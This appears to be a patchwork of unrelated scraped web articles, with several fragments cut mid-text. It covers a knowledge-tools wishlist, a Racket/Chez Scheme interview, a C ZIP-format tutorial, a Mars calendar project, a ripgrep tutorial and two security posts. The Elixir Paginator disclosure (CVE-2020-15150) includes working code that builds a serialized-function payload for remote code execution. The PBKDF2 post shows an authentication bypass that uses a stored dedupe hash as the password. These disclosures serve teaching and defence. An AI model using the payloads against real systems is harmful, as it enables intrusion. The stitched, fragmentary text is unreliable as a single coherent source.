transcribes all of their videos and Google Meet now generates live captions as we’re talking - why can’t we do something similar with podcast apps?</p></li></ul><p>Honorable Mentions: <a href="https://readwise.io/">Readwise</a>, <a href="https://www.weavatools.com/">Weava</a>, <a href="https://www.descript.com/">Descript</a>, <a href="https://otter.ai/">Otter.ai</a>, <a href="https://getpolarized.io/#features">Polar</a></p><h2 id="a-centralized-search-interface-for-my-digital-brain-memex">A centralized search interface for my digital brain (memex)&nbsp;<a href="#a-centralized-search-interface-for-my-digital-brain-memex">#</a></h2><p>I want to be able to open an interface, type three words, and instantly see results from everything my digital self has interacted with.

What makes it stand out in the LISP family?</strong></h2><p id="b428">Let’s distinguish “Racket the language” and “Racket the project”.</p><p id="f2e2">The Racket language is a general-purpose, Scheme-like language with an especially rich set of constructs for extending the language — even by Scheme standards. Racket includes support for writing quick-and-dirty macros, but it also supports nice macros with a good error checking that avoid surprising errors created in the expanded code. The close integration of macros and modules, an enforced phase separation between run-time and compile-time code, and the `#lang` mechanism for selecting the surface syntax all distinguish Racket from other Lisp variants.</p><p id="d48e">Even the main language Racket is written in a simpler language, and that is written in an even more simple language. This tower of languages makes development easier. You can look under the hood and see all the internal languages, or just ignore all of them and get a nice high level language.</p><p id="36f0">Less prominent, but also as important in practice for building language abstractions and composing them into large systems, are Racket’s run-time constructs: first-class control with continuation marks, custodians for simple and reliable task termination, reachability-based memory accounting, message-based parallelism via places, and Concurrent ML-style constructs for event-driven programs. Many of these constructs need support at lower levels of the runtime system, but then they can be used to build a wide variety of languages and libraries that mesh well.</p><p id="cb77">The Racket project synthesizes research, production, and education efforts toward the overall language-building goal. The idea of “A Programmable Programming Language” serves along those directions, from building student-friendly learning environments to domain-specific languages in application to pushing the frontiers of language design and implementation.</p><p id="a39d">The main page is <a href="https://racket-lang.org/" rel="noopener">https://racket-lang.org/</a></p><h2 id="47bc"><strong>What does it mean that you can write your own language?</strong></h2><p id="8534">For example, when you install Racket, it comes with 20 or 30 additional languages. (I’m not sure if someone has counted all of them.)</p><p id="adb8">There are a few “Student” languages that are designed for students. They are less powerful but have more compile time checks to detect common errors in beginners. And they have different levels so once you master one, you can use the next one that includes more features.</p><p id="e7f1">Another language is Typed Racket, that adds types to the Racket expressions, so it refuses to compile unless the types check. And it also uses the type information to optimize the code, so the compilation is slower, but the generated code can be faster.</p><p id="b5fa">There are languages that implement the version of Scheme in R5RS and R6RS and many of the SRFI. And you can install a package that adds the version in the R7RS-small.</p><p id="8dd3">And there are also more different languages with a very different syntax like a complete implementation of Algol 60.</p><p id="d422">All these languages share the same backend and you can call the libraries written in one language from any of the other languages that are included in the distribution, the additional languages you can download as packages, or the languages you create.</p><p id="7932"><strong>What’s the difference between Racket and Scheme?</strong></p><p id="f375">Racket started out as a Scheme implementation, and we would still call it “a Scheme.” Even though it does not fit a Scheme standard, it’s obviously derived from Scheme. There are many specific differences, such as the fact that `cons` always creates an immutable pair in Racket, but the main difference is philosophy: Scheme is meant to be a small language that gives you just enough to express lots of things. Racket is meant to be a big language, and while it gives you the same core pieces (and more) that can express lots of things, it also codifies the way many things are done to enable more cooperating libraries and languages.</p><h2 id="0256"><strong>What is Chez Scheme, how is it different from other Scheme implementations?</strong></h2><p id="1fb3">Chez Scheme is one of the oldest Scheme implementations, and its evolution informed many parts of the Scheme standard through R6RS. (Racket’s influence on the Scheme standard, in contrast, is limited to aspects of the R6RS library design.) Chez Scheme is a relatively small language, but like all instantiations of Scheme, the implementation provides a lot more than the standard specifies.</p><p id="3c1c">Chez Scheme’s biggest claim to fame is its performance. It has always been among the best-performing Scheme implementations. Its object-tagging and allocation regime, its hybrid stack–heap implementations of continuations, and its compiler structure all remain state-of-the-art, even in 2020.</p><p id="3095">For most of its existence, Chez Scheme was a proprietary, closed-source implementation, but it became open source in mid-2016. As it happens, we started considering a new Racket reimplementation around the start of 2017.</p><h2 id="54ea"><strong>Why did you choose Chez Scheme over other Schemes to rebuild Racket?</strong></h2><p id="db07">The biggest weakness of the Racket BC (“before Chez”) implementation are its back-end compiler structure, its inefficient internal calling conventions (over-adapted to C), and its poor implementation of first-class continuations. Those are exactly the strengths of Chez Scheme. Furthermore, Racket’s evaluation model was always closely aligned with Chez Scheme, such as the emphasis on interactive evaluation and compilation.</p><p id="d9a4">It was clear up front that Chez Scheme lacked significant features that Racket needs, such as support for continuation marks and reachability-based memory accounting. However, the high quality of the Chez Scheme design and implementation, in contrast to old Racket’s implementation, made adapting Chez Scheme more appealing than retrofitting Racket’s old implementation further.</p><h2 id="28e7"><strong>Why reimplement with Chez Scheme to reduce the C part instead of implementing the C stuff in Racket?</strong></h2><p id="2658">Mostly, we did reimplement the C stuff in Racket. The I/O subsystem, the concurrency subsystem (which includes the scheduler for “green” threads, Concurrent ML-style events, and custodians), and the regexp matcher were all rewritten in Racket. Those pieces followed the rewrite of the macro expander in Racket. Other things that needed to be moved out of C, such as the compiler and the extensive support for numbers that Racket inherited from Scheme, were already written in Scheme in Chez Scheme’s implementation.</p><p id="b995">A big part of the process was to understand what to implement in Racket, what in Chez Scheme, and what new layers to introduce in translation. This work and reorganization benefits other Racket implementation efforts, such as Pycket and RacketScript.</p><h2 id="de40"><strong>Besides improving maintainability, what are the advantages of building Racket with CS over C?</strong></h2><p id="4952">With the exception of the garbage collector and similar low-level parts of the runtime system, much of Racket’s implementation benefits from higher-level abstractions. Writing a macro expander in C was a particularly poor choice, since higher-level abstractions obviously make tree manipulations easier, but the same reasons apply for the I/O layer or numeric primitives. Even the garbage collector in [the Racket variant of] Chez Scheme is now half implemented by a specification and compiler that are written in Scheme.</p><p id="60db">The other big advantage is that the Racket community has a lot of Racket programmers, not C programmers. It’s easier to convince a fan of Racket to look at some code in Racket or Chez Scheme and try to find some bug or a new feature to contribute. The people that like to read and write code in C are probably making contributions to a C compiler.</p><h2 id="e706"><strong>What were the most challenging parts to implement?</strong></h2><p id="971c">The most challenging part is not really one part, but the overall scale. Racket is a big language, and it all has to work the same in the new implementation. That means not just getting the right result and/or a specific kind of error message, but getting results with the same or better performance characteristics. For example, if a macro generates a giant expansion that nevertheless compiles in reasonable time in Racket BC, then it needs to compile in reasonable time in Racket CS.</p><p id="c985">When it comes to specific pieces that we had to implement, perhaps the most challenging were adding type reconstruction to the compiler, adding support for continuation marks, allowing record values to act as procedures, reimplementing Racket’s I/O, and upgrading Chez Scheme’s …</p></div></div></section></div>

<p>Let's try creating a ZIP file from scratch. Since I'm mostly interested in the layout and meta-data we'll be using the option to add
the files <em>uncompressed</em>. That means I don't have to learn the [deflate] compression algorithm at the same time.
The resulting knowledge is still useful in that it will allow us to bundle a set of files into a single, ubiquitous format.
</p>
<p>unix [cpio] (or even [tar]) would be easier but it's not ubiquitous.... I'm looking at you DOS.
</p>
<p>I'll be using C for this, <s>since it's ubiquitous</s>... since I like it. Also, C is good for the kind of low-level bit manipulation
we'll be doing here.
Even if you don't like C there is still some useful information here about the zip file format.
(I was going to use Common Lisp, but it's not ubiquitous.)
</p>
<p>Useful resources:

</li></ul>
<h2> simplest zip file</h2>
<p>Zip files are read <em>from the end</em>. This allows the zip file to built in a single pass.
(It also allows some other tricks like prefixing data at the start of a zip file e.g. an executable to unpack the remainder.)
</p>
<p>A zip reader finds the final record by searching backwards for the record's magic number e.g. 0x06054b50
(a record is just a block of bytes in the file).
Every zip file must contain an <code>End of Central Directory Record</code> and the 
simplest zip file consists of only an End of Central Directory Record. That would be an empty zip file, but a zip file nevertheless.
</p>
<p><span>note the mention of disk numbers, this file format was invented back in the days of archives spanning multiple floppy disks.</span>
</p>
<p>The EOCD format is given here.
<a href="https://en.wikipedia.org/wiki/ZIP_(file_format)#End_of_central_directory_record_(EOCD)">https://en.wikipedia.org/wiki/ZIP_(file_format)#End_of_central_directory_record_(EOCD)</a>
</p>
<p>Remember that all integers (including the magic) must be written little-endian (i.e. byte reversed).
I will assume your platform does that automatically since most people will be using an Intel/AMD processor.
(Check the C functions ntohs() and ntohl() if your platform is big endian.)
</p>
<p>This is the C function which will write the EOCD record.

<p>Build the code and call the program to produce our zip file (on stdout):

<pre>$ make mkzip
$ ./mkzip &gt;ex.zip
$ file ex.zip

</pre>
<p>Congratulations! We have created a zip file from scratch. That will be all for today. Thank you for watching...

<h2> adding some files</h2>
<pre>$ unzip -l ex.zip
Archive:  ex.zip
warning [ex.zip]:  zipfile is empty
</pre>
<p>Ok, so we'd actually like to add some files to our archive. Otherwise what's the point?
</p>
<p>Every file we add must be prefixed with a <code>local file header</code> and, after all the files are added, we add a <code>Central Directory</code> record which
contains the locations (offsets) of all those files.
</p>
<p>Firstly let's add the local file header. It needs the length of the file and the length of the file name. No problem.
More difficult is that the header needs the CRC32 checksum of the file (to allow the zip reader to check the integrity of the archive).
<a href="https://en.wikipedia.org/wiki/ZIP_(file_format)#Local_file_header">https://en.wikipedia.org/wiki/ZIP_(file_format)#Local_file_header</a>
</p>
<p><span>The trailing data descriptor record which can be used to add the CRC32 checksum and file size/compressed size <em>after</em> we've written the file. This can help simplify the zip writer's job. We will not use these here.</span>
</p>
<p>I have a feeling that CRC32 checksums will be difficult. So let's just write a <strong>zero crc32</strong> and see what happens...
</p>
<a href="https://en.wikipedia.org/wiki/Cyclic_redundancy_check#CRC-32_algorithm">https://en.wikipedia.org/wiki/Cyclic_redundancy_check#CRC-32_algorithm</a>
<p>Call <code>local_file_header</code> for each file we want to add to the zip. I've defined a struct <code>zfile_t</code> to hold the file name and some
other information like it's size and crc32 (set to zero for now). <span>full code linked at the end</span>.

<h2> the central directory</h2>
<p>This record/block contains a list of all the files in the archive (it need not contain all the files we added, nor list them in the same
order; this allows deleting files without rewriting the entire archive, important if you have 10 floppy disks...).
</p>
<p>The central directory doesn't have a separate header. It's not really a record, more a sequence of records, one per file of interest.
These records are similar to the local file header records but have a few extra fields.
</p>
<p>Finally we must remember to update our, <em>now non-empty</em>, EOCD with link back to our central directory record. Until now we were just
writing zero into the EOCD fields [size of central directory] and [offset of central directory].
</p>
<p>We can easily capture the file offset before we start writing the Central Directory and get the size by subtracting it from the file
offset after we have written the Central Directory.

<p>Let's try unpacking our putative archive again. We learned that zip uses date formats based from 1980-00-00 (which is similar to the
unix epoch 1970-01-01, except with bigger shoulder pads and more hair gel). At the moment I'm not <em>too</em> interested in the timestamps.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="info">


  
  
  <p>A dithering playground, a calendar for another planet, a window on the inner solar system, an interactive map, all together. I wanted to learn some front-end libraries but also for curiosity 
    I imagined how a basic tool as the calendar should change on the most hyped planet of the solar system, Mars, where people will have to deal with 
    many hardships and limitations.</p>

    
   
    
  <p>This calendar is similar to ours. A year on Mars has 668 sols, days that span around 24h and 40 minutes, so a martian year roughly doubles our Earth year length, 
    and many people have imagined systems to divide them up. While scientists usually just count the sols from the start of the year and that's it, I think that when you have a continuous settlement it's convenient to have smaller chunks of time for 
    keeping track of repetitive matters. I based the subdivision on the Darian Calendar which divides the Mars Year in 24 months of 28 and 27 sols. The year starts every Vernal equinox, which is
  already the standard for scientists studying the martian seasons. When to count the year Zero from is a debated matter, the Darian Calendar uses 1610, others use 1953 (I did too), I think that when we'll have a continuous human presence it will probably restart from zero anyways.
  </p>

  
  
  <p>
    The martian life will bring heavy constraints to the first settlers: communication, dust storms, oxygen, energy, so to help with the most pressing and time-based of those I added some available information into the calendar. 
    Since any first colony will be still very dependant from Earth, communication with Earth will be super important, but with the distance between the two planets ranging from 100M to 400M kilometers, so the time gap for one-direction communication will vary between 5 and 20 minutes. Just imagine typing a url and wait forty minutes for a response.
    Even more crucial will be the supplies and people coming from Earth, so it will be useful to see in a glance upcoming transfer orbits and in general the positioning of the two planets.  <br>
    In the bottom right box I thought would be useful to have a handy small topographic map of the area of the outpost. Geography is helpful to navigate the rough terrains of Mars, but it also gives insights about one of the most precious resources on Mars: solar light.
    In this interactive map you can drag the marker around the map to see how solar irradiation changes during the seasons and throughout the latitudes.
  </p>
    

    
  

    <p>What started as a small learning project has become something I felt passionate about. I'm actually happy to show it around, 
      but at the same time I feel it could use some polishing (better cartography, better graphics, improved orbit calculations..).
      Also this project could take different shapes, for example I already printed a paper version for my desk!
    I really would like for this project to keep on growing and that would also help me give life to other ideas, so in case you are curious about them too, you can help me make those come true
 by purchasing the pdf version of the next Martian year, which will start on February 2021. </p>

 

 <p>

      It consists of 24 pages one for each month, and in each of them I handpicked the best dithered images I could get. I'm commited to continue to make improvements, 
      so for anybody buying this, I will gift a pdf of the new version when that will be ready. If you are really interested on those paper version of the calendar and the future twists this 
      or other projects will take, please sign up to the mailing list, of course no spammy intentions here.
    </p>

November 27, 2020 | https://www.alphabot.com/security/blog/2020/elixir/Remote-code-execution-vulnerability-in-Elixir-based-Paginator-project.html | <a href="https://web.archive.org/web/*/https://www.alphabot.com/security/blog/2020/elixir/Remote-code-execution-vulnerability-in-Elixir-based-Paginator-project.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <h2 id="intro">Intro</h2>

<p>In August of this year I found a remote code execution vulnerability in the Elixir-based <a href="">Paginator</a> open-source project from <a href="https://duffel.com/">Duffel</a> (a UK-based startup in the flight searching space).
The vulnerability has the CVE number <a href="https://github.com/duffelhq/paginator/security/advisories/GHSA-w98m-2xqg-9cvj">CVE-2020-15150</a> assigned. Since Duffel seemed to use Paginator for its own REST API it seems likely
that an attacker exploiting this vulnerability would have been able to execute code on Duffel’s (cloud) assets.</p>

<h2 id="vulnerability">Vulnerability</h2>

<p>This code execution vulnerability existed due to the use of Erlang’s <code>binary_to_term</code> in combination with untrusted user data.
This function is much more dangerous when used in Elixir.</p>

<p>The vulnerability could have been triggered via Paginator’s user provided before/after cursors. As seen in <a href="https://duffel.com/docs/api/overview/pagination">Duffel’s Pagination API</a>:</p>

<p><img src="https://www.alphabot.com/images/blog/elixir-paginator/duffel_paginator_api.png" alt="Duffel's Pagination REST API"></p>

<p>The string <code>g2wAAAACbQAAABBBZXJvbWlzdC1LaGFya2l2bQAAAB=</code> is a Base64 encoded binary serialized Erlang term (ETF).
Such an Erlang term can contain anything from simple string values to full-blown functions containing almost any code you’d like.
However, in normal Erlang such a function provided in the payload would not be executed automatically (at least if nobody explicitly calls that function).
In Elixir there’s a much higher chance that such a function is executed later down the road, thanks to the Enumerable protocol of Elixir.</p>

<h2 id="exploits">Exploits</h2>

<p>To demonstrate this vulnerability I created two exploits.
The first one starts <code>xcalc</code>:</p>

<figure><pre><code data-lang="elixir"><span>defp</span> <span>rce_start_xcalc</span><span>()</span> <span>do</span>
    <span>exploit</span> <span>=</span> <span>fn</span> <span>_</span><span>,</span> <span>_</span> <span>-&gt;</span>  <span>System</span><span>.</span><span>cmd</span><span>(</span><span>"</span><span>xcalc"</span><span>,</span> <span>[]);</span> <span>{</span><span>:cont</span><span>,</span> <span>[]}</span> <span>end</span>
    <span>payload</span> <span>=</span>
    <span>exploit</span>
    <span>|&gt;</span> <span>:erlang</span><span>.</span><span>term_to_binary</span><span>()</span>
    <span>|&gt;</span> <span>Base</span><span>.</span><span>url_encode64</span><span>()</span>
<span>end</span></code></pre></figure>

<p>The second one prints the stacktrace (so we see where our anonymous function has been triggered):</p>

<figure><pre><code data-lang="elixir"><span>defp</span> <span>rce_print_stacktrace</span><span>()</span> <span>do</span>
    <span>exploit</span> <span>=</span> <span>fn</span> <span>_</span><span>,</span> <span>_</span> <span>-&gt;</span>  <span>IO</span><span>.</span><span>inspect</span><span>(</span><span>Process</span><span>.</span><span>info</span><span>(</span><span>self</span><span>(),</span> <span>:current_stacktrace</span><span>),</span> <span>label:</span> <span>"</span><span>RCE STACKTRACE"</span><span>);</span> <span>{</span><span>:cont</span><span>,</span> <span>[]}</span> <span>end</span>
    <span>payload</span> <span>=</span>
    <span>exploit</span>
    <span>|&gt;</span> <span>:erlang</span><span>.</span><span>term_to_binary</span><span>()</span>
    <span>|&gt;</span> <span>Base</span><span>.</span><span>url_encode64</span><span>()</span>
<span>end</span></code></pre></figure>

<p>The functions above create a Base64 encoded exploit payload (same as the cursors used by Paginator).
However, they do not include information about the whereabouts of the cursor, but instead contain an anonymous function that we want the server to execute.
(An attacker would execute this functions above on his side, only providing the Base64 encoded payload to an API using Duffel’s Paginator.)</p>

<p>The stacktrace output of the second exploit payload looked like this (when executed from a unit test):</p>

<figure><pre><code data-lang="text">......RCE STACKTRACE: {:current_stacktrace,
[
{Process, :info, 2, [file: 'lib/process.ex', line: 767]},
{PaginatorTest, :"-rce_print_stacktrace/0-fun-0-", 2,
    [file: 'test/paginator_test.exs', line: 945]},
{Stream, :do_zip_next_tuple, 5, [file: 'lib/stream.ex', line: 1191]},
{Stream, :do_zip, 3, [file: 'lib/stream.ex', line: 1168]},
{Enum, :zip, 1, [file: 'lib/enum.ex', line: 2820]},
{Paginator.Ecto.Query, :filter_values, 4,
    [file: 'lib/paginator/ecto/query.ex', line: 43]},
{Paginator.Ecto.Query, :maybe_where, 2,
    [file: 'lib/paginator/ecto/query.ex', line: 103]},
{Paginator.Ecto.Query, :paginate, 2,
    [file: 'lib/paginator/ecto/query.ex', line: 12]},
{Paginator, :entries, 4, [file: 'lib/paginator.ex', line: 325]},
{Paginator, :paginate, 4, [file: 'lib/paginator.ex', line: 180]},
{PaginatorTest,
    :"test paginate a collection of payments, sorting by charged_at sorts ascending with before cursor",
    1, [file: 'test/paginator_test.exs', line: 78]},
{ExUnit.Runner, :exec_test, 1, [file: 'lib/ex_unit/runner.ex', line: 355]},
{:timer, :tc, 1, [file: 'timer.erl', line: 166]},
{ExUnit.Runner, :"-spawn_test_monitor/4-fun-1-", 4,
    [file: 'lib/ex_unit/runner.ex', line: 306]}
]}</code></pre></figure>

<p>This stacktrace reveals that the exploit function was triggered on <a href="https://github.com/duffelhq/paginator/blob/6f27a391d393924577d0e91d7a07c2dce89bac1d/lib/paginator/ecto/query.ex#L43">line 43 of query.ex</a> by the function <code>Enum.zip</code>:
our anonymous function is implicitly called by Elixir (thanks to the Enumerable protocol).</p>

<h2 id="additional-information">Additional information</h2>

<p>This is not the first time a vulnerability caused by the use of <code>binary_to_term</code> in combination with untrusted data has been found.
<a href="https://twitter.com/griffinbyatt">Griffin Byatt</a> probably discovered the first publicly known:
<a href="https://blog.voltone.net/post/10">Code execution through the session cookie</a> in the popular
and widely used Elixir <a href="https://hexdocs.pm/plug/readme.html">Plug</a>.</p>

<p>The Security Working Group of the Erlang Ecosystem Foundation has some recommendations regarding <a href="https://erlef.github.io/security-wg/secure_coding_and_deployment_hardening/serialisation">Serialisation and deserialisation</a>
including recommendations for mitigations.</p>

<div>
      
      <p>
        The official <a href="https://erlang.org/doc/man/erlang.html#binary_to_term-1">Erlang documentation</a> does "warn" about <code>binary_to_term/1</code>, and recommends <code>binary_to_term/2</code>.
        However, using <code>binary_to_term/2</code> is not a protection against the code execution shown here (especially not in Elixir). In fact the paginator library used <code>binary_to_term/2</code> with the <code>safe</code> option.
        Using <code>binary_to_term/2</code> with the <code>safe</code> option only protects against certain Denial of Service attacks.
      </p>
</div>

<h2 id="thanks">Thanks</h2>

<p>Thanks are in order for Duffel (the maintainers of this project):</p>
<ul>
  <li>Firstly: Duffel fixed the vulnerability in <b>less than one day</b> and acted very professionally throughout the process.</li>
  <li>Secondly: Despite not having a bug bounty program, Duffel payed a bounty of 1000 GBP, which I donated in parts to a
fund providing help for victims of the explosion in the port of Lebanon.</li>
</ul>

		<div>

			
<p>Imagine you’re a software developer, and you need to authenticate users based on a username and password.</p>



<p>If you’re well-read on the industry standard best practices, you’ll probably elect to use something like bcrypt, scrypt, Argon2id, or PBKDF2. (If you thought to use something else, you’re almost certainly doing it wrong.)</p>



<p>Let’s say, due to technical constraints, that you’re forced to select PBKDF2 out of the above options, but you’re able to use a suitable hash function (i.e. SHA-256 or SHA-512, instead of SHA-1).</p>



<p>Every password is hashed with a unique 256-bit salt, generated from a <a href="https://www.2uo.de/myths-about-urandom/">secure random generator</a>, and has an iteration count in excess of 80,000 (for SHA-512) or 100,000 (for SHA-256). So far, so good.</p>







<p>Let’s also say your users’ passwords are long, randomly-generated strings. This can mean either you’re building a community of password manager aficionados, or your users are actually software bots with API keys.</p>



<p>Every user’s password is, therefore, always a 256 character string of random hexadecimal characters.</p>



<p>Two sprints before your big launch, your boss calls you and says, “Due to arcane legal compliance reasons, we need to be able to detect duplicate passwords. It needs to be fast.”</p>



<p>You might might think, “That sounds like a hard problem to solve.”</p>



<p>Your boss insists, “The passwords are all too long and too high-entropy to reliably attacked, even when we’re using a fast hash, so we should be able to get by with a simple hash function for deduplication purposes.”</p>



<p>So you change your code to look like this:</p>


<pre title="">&lt;?php
use ParagonIE\EasyDB\EasyDB;
use MyApp\Security\PasswordHash;

class Authentication {
    private EasyDB $db;
    public function __construct(EasyDB $db)
    {
        $this-&gt;db = $db;
        $this-&gt;pwhash = new PasswordHash('sha256');
    }
    
    public function signUp(string $username, string $password)
    {
        // New:
        $hashed = hash('sha256', $password);
        if ($db-&gt;exists(
            "SELECT count(id) FROM users WHERE pw_dedupe = ?",
            $hashed
        )) {
            throw new Exception(
               "You cannot use the same username or password as another user."
            );
        }

        // Original:
        if ($db-&gt;exists(
            "SELECT count(id) FROM users WHERE username = ?",
            $username
        )) {
            throw new Exception(
               "You cannot use the same username or password as another user."
            );
        }
        $this-&gt;db-&gt;insert('users', [
            'username' =&gt; $username,
            'pwhash' =&gt; $this-&gt;pwhash-&gt;hash($password),
            // Also new:
            'pw_dedupe' =&gt; $hashed
        ]);
    }

    public function logIn(string $username, string $password): int
    {
        // This is unchanged:
        $user = $this-&gt;db-&gt;row("SELECT * FROM users WHERE username = ?", $username);
        if (empty($user)) {
            throw new Exception("Security Error: No user");
        }
        if ($this-&gt;pwhash-&gt;verify($password, $user['pwhash'])) {
            throw new Exception("Security Error: Incorrect password");
        }
        return (int) $user['id'];
    }
}
</pre>


<p>Surely, this won’t completely undermine the security of the password hashing algorithm?</p>

<p>Three years later, a bored hacker discovers a read-only SQL injection vulnerability, and is immediately able to impersonate any user in your application.</p>



<p>What could have possibly gone wrong?</p>

<p>In order to understand what went wrong in our hypothetical scenario, you have to kinda know what’s under the hood in the monstrosity that our hypothetical developer slapped together.</p>



<h3 id="pbkdf2">PBKDF2</h3>



<p>PBKDF2 stands for <strong>P</strong>assword-<strong>B</strong>ased <strong>K</strong>ey <strong>D</strong>erivation <strong>F</strong>unction #2. If you’re wondering where PBKDF1 went, I discussed its vulnerability in another blog post about <a href="https://soatok.blog/2020/05/05/putting-the-fun-in-hash-function/">the fun we can have with hash functions</a>.</p>



<p>PBKDF2 is supposed to be instantiated with some kind of pseudo-random function, but it’s almost always HMAC with some hash function (SHA-1, SHA-256, and SHA-512 are common).</p>



<p>So let’s take a look at HMAC.</p>



<h3 id="hmac">HMAC</h3>



<p>HMAC is a Message Authentication Code algorithm based on Hash functions. Its definition looks like this:</p>







<p>For the purposes of this discussion, we only care about the definition of K’.</p>



<p>If your key (K) is larger than the block size of the hash function, it gets pre-hashed with that hash function. If it’s less than or equal to the block size of the hash function, it doesn’t.</p>



<p>So, what is PBKDF2 doing with K?</p>



<h3 id="how-pbkdf2-uses-hmac">How PBKDF2 Uses HMAC</h3>



<p>The RFCs that define PBKDF2 aren’t super helpful here, but one needs only look at <a href="https://defuse.ca/php-pbkdf2.htm">a reference implementation</a> to see what’s happening.</p>


<pre title="">// first iteration
$last = $xorsum = hash_hmac($algorithm, $last, $password, true);
// perform the other $count - 1 iterations
for ($j = 1; $j &lt; $count; $j++) {
	$xorsum ^= ($last = hash_hmac($algorithm, $last, $password, true));
}
$output .= $xorsum;
</pre>


<p>If you aren’t fluent in PHP, it’s using the previous round’s output as the message (m in the HMAC definition) and the password as the key (K).</p>



<p>Which means if your password is larger than the block size of the hash function used by HMAC (which is used by PBKDF2 under the hood), it will be pre-hashed.</p>



<h3 id="exploit">The Dumbest Exploit Code</h3>



<p>Okay, with all of that in mind, here’s how you can bypass the authentication of the above login script.</p>


<pre title="">$httpClient-&gt;loginAs(
    $user['username'],
    hex2bin($user['pw_dedupe'])
);
</pre>


<p>Since K’ = H(K) when Length(K) &gt; BlockSize(H), you can just take the pre-calculated hash of the user’s password and use that <em>as the password</em> (although not hex-encoded), and it will validate. (<a href="https://3v4l.org/nqoRI">Demo</a>.)</p>

<p>Above, when HMAC defined K’, it included a variant in its definition. Adding variants to hash function is a dumb way to introduce the risk of collisions. (See also: <a href="https://soatok.blog/2020/07/15/kerlissions-trivial-collisions-in-iotas-hash-function-kerl/">Trivial Collisions in IOTA’s Kerl hash function</a>.)</p>



<p>Also, some PBKDF2 implementations that mishandle the pre-hashing of K, which <a href="https://github.com/defuse/php-encryption/issues/230">can lead to denial-of-service attacks</a>. Fun stuff, right?</p>



<h3 id="mitigations">Some Dumb Yet Effective Mitigations</h3>



<p>Here are a few ways the hypothetical developer could have narrowly avoided this security risk:</p>



<ul><li>Use a different hash function for PBKDF2 and the deduplication check.<ul><li>e.g. PBKDF2-SHA256 and SHA512 would be impervious</li></ul></li><li>Always pre-hashing the password before passing it to PBKDF2.<ul><li>Our exploit attempt will effectively be double-hashed, and will not succeed.</li></ul></li><li>Use HMAC instead of a bare hash for the deduplication. With a hard-coded, constant key.</li><li>Prefix the password with a distinct domain separation constant in each usage.</li><li>Truncate the hash function, treating it as a Bloom filter.</li><li>Some or all of the above.</li><li><strong>Push back</strong> on implementing this stupid feature to begin with.</li></ul>



<p>Subtle problems often (<a href="https://github.com/cr-marcstevens/sha1collisiondetection">but not always</a>) call for subtle solutions.</p>



<h3>Password Security Advice, Revisited</h3>



<p>One dumb mitigation technique I didn’t include above is, “Using passwords shorter than the block size of the hash function.” The information security industry almost unanimously agrees that <a href="https://crambler.com/password-security-why-secure-passwords-need-length-over-complexity/">longer passwords are better than short ones</a> (assuming both have the same distribution of possible characters at each position in the string, and are chosen randomly).</p>



<p>But here, we have a clear-cut example where having a longer password actually <em>decreased</em> security by allowing a trivial authentication bypass. Passwords with a length less than or equal to the block size of the hash function would not be vulnerable to the attack.</p>



<p>For reference, if you ever wanted to implement this control (assuming ASCII characters, where 1 character = 1 byte):</p>



<ul><li>64-character passwords would be the upper limit for MD5, SHA-1, SHA-224, and SHA-256.</li><li>128-character passwords would be the upper limit for SHA-384 and SHA-512.</li><li>(Since the above example used 256-character passwords, it always overflows.)</li></ul>



<p>But really, one of the other mitigation techniques would be better. Limiting the input length is just a band-aid.</p>



<h3 id="optimized-cracking">Another Non-Obvious Footgun</h3>



<p>Converse to the block size of the hash function, the <em>output size</em> of the hash function also affects the security of PBKDF2, because each output is calculated sequentially. If you request more bytes out of a PBKDF2 function than the hash function outputs, it will have to work at least twice as hard.</p>



<p>This means that, while a legitimate user has to calculate the entire byte stream from PBKDF2, an attacker can just target the first N bytes (20 for SHA-1, 32 for SHA-256, 64 for SHA-512) of the raw hash output and attack <em>that</em> instead of doing all the work.</p>



<h2 id="is-crypto-hard">Is Cryptography Hard?</h2>



<p>I’ve fielded a lot of questions in the past few weeks, and consequently overheard commentary from folks insisting that cryptography is a hard discipline and therefore only the smartest should study it. I disagree with that, but not for the reason that most will expect.</p>



<p>Many of the people reading this page will tell me, “This is such a dumb and obvious design flaw. Nobody would ship that code in production,” because they’re clever or informed enough to avoid disaster.</p>



<p>Yet, we still regularly hear about <a href="https://www.howmanydayssinceajwtalgnonevuln.com/">JWT alg=none vulnerabilities</a>. And <a href="https://arxiv.org/abs/1510.08555">Johnny still still can’t encrypt</a>. So cryptography surely can’t be <em>easy</em>.</p>







<p>Real-world cryptographic work is cognitively demanding. It becomes increasingly mathematically intensive <a href="https://soatok.blog/2020/06/10/how-to-learn-cryptography-as-a-programmer/">the deeper you study</a>, and nobody knows how to name things that non-cryptographers can understand. (Does anyone intuitively understand what a <strong>public key</strong> is outside of our field?)</p>



<p>In my opinion, cryptography is certainly challenging and widely misunderstood. There are a lot of subtle ways for secure building blocks to be stitched together insecurely. …</p></div></div></div>

    <div>
      <p>This post shows how you can use <code>ripgrep</code>, <code>perl</code> and <code>sd</code> to perform multiline fixed string search and replace operations from the command line. Solution with <code>GNU sed</code> is also discussed, along with its limitations.</p>
<h2 id="fixed-string-matching">Fixed string matching<a href="#fixed-string-matching" aria-label="Anchor link for: fixed-string-matching">🔗</a></h2>
<p>The below sample input file will be used in the examples in this post.</p>
<pre><code><span>$ cat ip.txt
This is a multiline
sample input with lots
of special characters
like . () * [] $ {}
^ + ? \ and ' and so on.
This post shows how
you can do fixed
-string multiline
search with cli tools.
</span></code></pre><h3 id="ripgrep">ripgrep<a href="#ripgrep" aria-label="Anchor link for: ripgrep">🔗</a></h3>
<p><a href="https://github.com/BurntSushi/ripgrep">ripgrep</a> supports <code>-U</code> option to allow multiline matching. Use <code>-F</code> option to turn off regexp matching, i.e. treat the search string literally. In <code>bash</code> shell (and likely most other shells), you can press enter key to insert literal newline character for quoted values. When you do so, the next line starts with <code>&gt;</code> and a space character. This isn't shown in the examples below to make it easier to copy-paste the commands.</p>
<pre><code><span>$ rg -UF 'like . () * [] $ {}
^ + ? \ and' ip.txt
4:like . () * [] $ {}
5:^ + ? \ and ' and so on.

# -l option shows only filename instead of all the matching lines
$ rg -lUF 'like . () * [] $ {}
^ + ? \ and' ip.txt
ip.txt
</span></code></pre>
<p>You'll have an issue if your search string itself contains single quote characters. Avoid using double quotes as a workaround, as that has its own set of special characters. You can work around by concatenating multiple strings next to each other, along with escaped single quote characters as needed.</p>
<pre><code><span># -N option disables line number prefix
$ rg -NUF 'like . () * [] $ {}
^ + ? \ and '\'' and' ip.txt
like . () * [] $ {}
^ + ? \ and ' and so on.
</span></code></pre>
<p>If your search string starts with <code>-</code> character, you'll have to use <code>--</code> before the search argument.</p>
